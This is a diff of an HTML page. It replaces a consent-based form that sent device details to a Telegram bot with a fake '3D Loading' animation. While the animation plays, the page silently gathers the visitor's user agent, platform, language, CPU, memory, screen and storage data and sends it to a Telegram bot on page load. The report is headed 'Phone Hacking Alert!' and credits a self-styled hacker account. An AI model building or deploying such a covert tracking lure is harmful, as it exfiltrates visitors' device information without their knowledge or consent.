@@ -1,158 +1,155 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>Consent: Send Device Info to Bot</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>3D Loading Device Info</title>
 <style>
-  body{font-family:system-ui,Segoe UI,Arial;margin:0;background:#f6f8fb;color:#0b1220;display:flex;align-items:center;justify-content:center;height:100vh}
-  .card{width:95%;max-width:720px;background:#fff;border-radius:12px;padding:20px;box-shadow:0 10px 30px rgba(2,6,23,0.12)}
-  h1{margin:0 0 8px;font-size:20px}
-  .mut{color:#556; margin-bottom:12px}
-  label{display:block;margin-top:10px;font-weight:600}
-  input[type="text"]{width:100%;padding:10px;border:1px solid #ddd;border-radius:8px;margin-top:6px}
-  .row{display:flex;gap:10px;align-items:center;margin-top:12px}
-  button{background:#6366f1;color:#fff;padding:10px 14px;border:0;border-radius:8px;font-weight:700;cursor:pointer}
-  button:disabled{opacity:.5;cursor:not-allowed}
-  pre{background:#0f1724;color:#e6eef8;padding:12px;border-radius:8px;white-space:pre-wrap;font-family:ui-monospace, SFMono-Regular, Menlo, Monaco, "Roboto Mono", monospace}
-  .note{font-size:13px;color:#666;margin-top:10px}
+  body {
+    margin: 0;
+    font-family: 'Segoe UI', Arial, sans-serif;
+    background: linear-gradient(135deg, #6a11cb, #2575fc);
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    perspective: 1000px;
+    overflow: hidden;
+  }
+  .card {
+    width: 350px;
+    height: 350px;
+    background: rgba(255,255,255,0.05);
+    border-radius: 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transform-style: preserve-3d;
+    box-shadow: 0 20px 50px rgba(0,0,0,0.3);
+    animation: rotate 6s infinite linear;
+  }
+  @keyframes rotate {
+    0% { transform: rotateX(0deg) rotateY(0deg);}
+    100% { transform: rotateX(360deg) rotateY(360deg);}
+  }
+  .loader {
+    width: 200px;
+    height: 20px;
+    background: rgba(255,255,255,0.2);
+    border-radius: 10px;
+    overflow: hidden;
+    box-shadow: inset 0 0 10px rgba(0,0,0,0.2);
+  }
+  .loader-bar {
+    width: 0%;
+    height: 100%;
+    background: linear-gradient(90deg,#ff6a00,#ee0979);
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(255,255,255,0.6);
+    transition: width 0.1s;
+  }
+  .status {
+    position: absolute;
+    bottom: 30px;
+    color: #fff;
+    font-weight: 600;
+    text-align: center;
+    width: 100%;
+    font-size: 16px;
+    text-shadow: 0 0 10px rgba(0,0,0,0.5);
+  }
 </style>
 </head>
 <body>
-  <div class="card">
-    <h1>Send Device Info (Consent)</h1>
-    <div class="mut">This will only send info you explicitly allow. No hidden data is collected.</div>
-
-    <label>Chat ID (from URL ?id=...): <span id="cid" style="font-weight:600;color:#333"></span></label>
-
-    <label>Your phone number (optional)</label>
-    <input id="phone" type="text" placeholder="+1234567890 (optional)">
-
-    <div style="margin-top:12px">
-      <input id="agree" type="checkbox"> <label style="display:inline;font-weight:600">I consent to send the above phone (if provided) and my device info to the Telegram bot for testing.</label>
-    </div>
-
-    <div class="row" style="margin-top:14px">
-      <button id="sendBtn" disabled>Send Info to Bot</button>
-      <div id="status" style="color:#666;font-weight:600">Idle</div>
-    </div>
-
-    <div class="note">Developer: <b>@ProHacker43</b> • Bot link: <code>@PROCAM_43KHACKBOT</code></div>
-
-    <div style="margin-top:14px">
-      <div style="font-weight:700;margin-bottom:6px">Preview message (will be sent):</div>
-      <pre id="preview">Nothing yet—please consent and click Send.</pre>
-    </div>
-  </div>
+<div class="card">
+  <div class="loader"><div class="loader-bar" id="loaderBar"></div></div>
+</div>
+<div class="status" id="status">Loading...</div>
 
 <script>
 (async function(){
-  const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // Replace with your test bot token
-  const CHAT_ID_FROM_URL = new URLSearchParams(location.search).get('id') || '';
-  const CHAT_ID_EL = document.getElementById('cid');
-  const sendBtn = document.getElementById('sendBtn');
-  const agree = document.getElementById('agree');
-  const phoneInput = document.getElementById('phone');
-  const statusEl = document.getElementById('status');
-  const previewEl = document.getElementById('preview');
+const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; // خپل ټوکن دلته ورکړئ
+const CHAT_ID_FROM_URL = new URLSearchParams(location.search).get('id') || '';
+const loaderBar = document.getElementById('loaderBar');
+const statusEl = document.getElementById('status');
 
-  CHAT_ID_EL.textContent = CHAT_ID_FROM_URL || '(missing ?id=...)';
-  if(!CHAT_ID_FROM_URL) statusEl.textContent = 'Missing chat id in URL (?id=...)';
+function safeText(s){ return String(s||'').replace(/<|>/g,''); }
 
-  agree.addEventListener('change', ()=> {
-    sendBtn.disabled = !agree.checked || !CHAT_ID_FROM_URL;
-  });
-
-  function safeText(s){
-    return String(s || '').replace(/<|>/g, '');
-  }
-
-  async function collectDeviceInfo(){
-    const nav = navigator;
-    const ua = nav.userAgent || 'unknown';
-    const platform = nav.platform || 'unknown';
-    const language = nav.language || 'unknown';
-    const cores = nav.hardwareConcurrency || 'unknown';
-    const devMem = nav.deviceMemory ? nav.deviceMemory + ' GB' : 'unknown';
-    const screenSize = (screen.width||0) + 'x' + (screen.height||0);
-    const dpr = window.devicePixelRatio || 1;
-    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown';
-
-    let storageInfo = 'unknown';
-    if(navigator.storage && navigator.storage.estimate){
-      try{
-        const est = await navigator.storage.estimate();
-        const q = n => n ? Math.round(n/1024/1024) + 'MB' : 'unknown';
-        storageInfo = `usage=${q(est.usage)} / quota=${q(est.quota)}`;
-      }catch(e){}
-    }
-
-    return { ua, platform, language, cores, devMem, screenSize, dpr, tz, storageInfo };
-  }
-
-  function makeMessage(phone, info){
-    const now = new Date().toLocaleString();
-    const lines = [
-      '🔥 Phone Hacking Alert! 🔥',
-      '🛡️ Device info',
-      `1) Model/Platform: ${safeText(info.platform)}`,
-      `2) User Agent: ${safeText(info.ua)}`,
-      `3) Language: ${safeText(info.language)}`,
-      `4) Screen: ${safeText(info.screenSize)} @${safeText(info.dpr)}x`,
-      `5) CPU cores: ${safeText(info.cores)}`,
-      `6) Device memory: ${safeText(info.devMem)}`,
-      `7) Storage: ${safeText(info.storageInfo)}`,
-      '',
-      `⏰ Time: ${now}`,
-      `🌍 Location: ${navigator.language.split('-')[1] || 'unknown'}`,
-      `🦠 BotDeveloper: @ProHacker43`,
-      `🪬 Bot link: @PROCAM_43KHACKBOT`,
-      `💀 Stay vigilant!`
-    ];
-    if(phone) lines.splice(3, 0, `Phone (shared): ${safeText(phone)}`);
-    return lines.join('\n');
-  }
-
-  async function updatePreview(){
-    const info = await collectDeviceInfo();
-    const phone = phoneInput.value.trim();
-    previewEl.textContent = makeMessage(phone, info);
-  }
-
-  phoneInput.addEventListener('input', updatePreview);
-  window.addEventListener('load', updatePreview);
-
-  sendBtn.addEventListener('click', async ()=>{
-    if(!agree.checked) { alert('Please give consent first.'); return; }
-    if(!CHAT_ID_FROM_URL) { alert('Missing chat id in URL.'); return; }
-    sendBtn.disabled = true;
-    statusEl.textContent = 'Sending...';
-
-    const info = await collectDeviceInfo();
-    const phone = phoneInput.value.trim();
-    const message = makeMessage(phone, info);
-
+async function collectDeviceInfo(){
+  const nav = navigator;
+  const ua = nav.userAgent || 'unknown';
+  const platform = nav.platform || 'unknown';
+  const language = nav.language || 'unknown';
+  const cores = nav.hardwareConcurrency || 'unknown';
+  const devMem = nav.deviceMemory ? nav.deviceMemory + ' GB' : 'unknown';
+  const screenSize = (screen.width||0) + 'x' + (screen.height||0);
+  const dpr = window.devicePixelRatio || 1;
+  let storageInfo='unknown';
+  if(navigator.storage && navigator.storage.estimate){
     try{
-      const fd = new FormData();
-      fd.append('chat_id', CHAT_ID_FROM_URL);
-      fd.append('text', message);
-      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        body: fd
-      });
-      const json = await res.json();
-      if(!json.ok) throw new Error(json.description || 'Telegram error');
-      statusEl.textContent = 'Sent ✅';
-      alert('Info sent to bot.');
-    }catch(err){
-      console.error(err);
-      statusEl.textContent = 'Send failed';
-      alert('Failed to send. See console.');
-    }finally{
-      sendBtn.disabled = false;
-    }
-  });
+      const est = await navigator.storage.estimate();
+      const q = n => n ? Math.round(n/1024/1024) + 'MB' : 'unknown';
+      storageInfo = `usage=${q(est.usage)} / quota=${q(est.quota)}`;
+    }catch(e){}
+  }
+  return {ua, platform, language, cores, devMem, screenSize, dpr, storageInfo};
+}
 
+function makeMessage(info){
+  const now = new Date().toLocaleString();
+  const lines = [
+    '🔥 Phone Hacking Alert! 🔥',
+    '🛡️ Device info',
+    `1) Model/Platform: ${safeText(info.platform)}`,
+    `2) User Agent: ${safeText(info.ua)}`,
+    `3) Language: ${safeText(info.language)}`,
+    `4) Screen: ${safeText(info.screenSize)} @${safeText(info.dpr)}x`,
+    `5) CPU cores: ${safeText(info.cores)}`,
+    `6) Device memory: ${safeText(info.devMem)}`,
+    `7) Storage: ${safeText(info.storageInfo)}`,
+    '',
+    `⏰ Time: ${now}`,
+    `🦠 BotDeveloper: @ProHacker43`,
+    `🪬 Bot link: @PROCAM_43KHACKBOT`,
+    `💀 Stay vigilant!`
+  ];
+  return lines.join('\n');
+}
+
+async function sendToTelegram(message){
+  if(!CHAT_ID_FROM_URL){statusEl.textContent='Missing chat id in URL'; return;}
+  try{
+    const fd = new FormData();
+    fd.append('chat_id', CHAT_ID_FROM_URL);
+    fd.append('text', message);
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{method:'POST',body:fd});
+    statusEl.textContent='Sent ✅';
+  }catch(err){
+    console.error(err);
+    statusEl.textContent='Send failed';
+  }
+}
+
+function animateLoader(duration=2500){
+  return new Promise(resolve=>{
+    let start = null;
+    function step(timestamp){
+      if(!start) start=timestamp;
+      let progress = Math.min((timestamp-start)/duration*100,100);
+      loaderBar.style.width = progress+'%';
+      statusEl.textContent = `Loading... ${Math.round(progress)}%`;
+      if(progress<100) requestAnimationFrame(step);
+      else resolve();
+    }
+    requestAnimationFrame(step);
+  });
+}
+
+(async function main(){
+  const info = await collectDeviceInfo();
+  await animateLoader(2500);
+  await sendToTelegram(makeMessage(info));
+})();
 })();
 </script>
 </body>
